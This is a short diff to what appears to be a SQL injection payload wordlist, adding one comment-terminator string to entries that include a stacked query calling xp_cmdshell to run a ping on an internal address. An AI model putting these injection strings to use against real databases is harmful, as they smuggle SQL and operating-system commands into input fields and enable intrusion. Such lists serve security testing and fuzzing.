@@ -1,3 +1,4 @@
+; --
 '; --
 '); --
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
